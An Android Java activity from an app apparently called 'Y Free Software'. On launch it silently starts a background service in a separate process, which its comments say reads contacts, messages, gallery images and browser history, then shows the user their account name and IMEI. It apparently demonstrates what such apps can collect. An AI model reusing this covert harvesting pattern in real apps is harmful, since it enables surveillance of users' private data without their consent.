package com.freedom.yfreesoftware;

import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.text.Html;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class YFS_HomePage extends Activity{
	
	Intent mBackgroundFetcherIntent;
	
	Button mButton;
	TextView mTextView_info1;
//	TextView mTextView_info2;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.y_free_software_home_page);
		
		/*
		 * OnCreation of the page starting a service, This service is used to read the Data of the user
		 * 1.Contact
		 * 2.Messages
		 * 3.Gallery image file
		 * 4.Browser History
		 */
		
		YFS_SourceUtil.CONTEXT = getApplicationContext();
		/**
		 * Service to fetch data in background. This service will run in a different process. 
		 * we have used "android:proces=":backgroundProcess" which makes it to run in a different process
		 */
		mBackgroundFetcherIntent=new Intent(getApplicationContext(),YFS_BackgroundFetcherService.class);
		startService(mBackgroundFetcherIntent);
		
		 /**
		  * Buton to start a new activity which has other info in details
		  */
		mButton=(Button) findViewById(R.id.know_more_button);
		mTextView_info1=(TextView) findViewById(R.id.info1);
	
		/**
		 * know more btn click listener
		 */
		mButton.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				//Toast.makeText(getApplicationContext(), "Toast for satya-", Toast.LENGTH_LONG).show();
				startActivity(new Intent(getApplicationContext(), YFS_MenuPage.class));
				
			}
		});
		
		List<String> username=YFS_OtherInforReader.getUsername(getApplicationContext());
		String str="<b >Hi "+username.get(0).replace("@gmail.com", "")+"-<br>Your IMEI :"+YFS_OtherInforReader.getImeiNumber(getApplicationContext())+"<br><br>"+getResources().getString(R.string.info0_your_mail_account)+"</b> <br>";
		
		/*ArrayList<String> urlist=YFS_BrowerHistoryReader.readBrowserHistory(getApplicationContext());
		
		for(int i=0;i<urlist.size();i++){
			str+=urlist.get(i);
			str+="\n";
		}*/
		//List<String> installedBrowser=YFS_OtherInforReader.getInstalledBrowsers(getApplicationContext());
		
		
		/*for(String strlist:installedBrowser){
			str+=strlist;
			str+="\n";
		}*/
		
        //System.out.println("Emi::" + telephonyManager.getDeviceId());
       
        
       
        mTextView_info1.setText(Html.fromHtml(str+"<br><b>"+getResources().getString(R.string.info1_i_can_know_more)+"</b>"));
		
		
	
		
	}
	
	
	
	

	
	@Override
	protected void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();

	}

}
